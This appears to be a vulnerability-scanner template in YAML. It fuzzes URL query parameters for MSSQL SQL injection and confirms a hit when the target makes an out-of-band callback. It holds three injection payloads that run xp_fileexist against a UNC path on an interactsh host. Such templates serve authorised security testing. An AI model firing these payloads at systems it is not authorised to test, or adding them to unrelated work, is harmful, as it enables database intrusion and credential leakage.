http:
- fuzzing:
  - fuzz:
    - '{{fileexist}}'
    mode: single
    part: query
    type: replace
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    fileexist:
    - 1'; exec master..xp_fileexist '\\{{interactsh-url}}\\file'--
    - 1; exec master..xp_fileexist '\\{{interactsh-url}}\\file'--
    - 1"; exec master..xp_fileexist '\\{{interactsh-url}}\\file'--
  stop-at-first-match: true
id: ai-fuzz-xp-fileexist-oob
info:
  author: openai
  name: MSSQL xp_fileexist UNC path OOB
  severity: high
  tags: mssql,rce,sqli,oob,dast
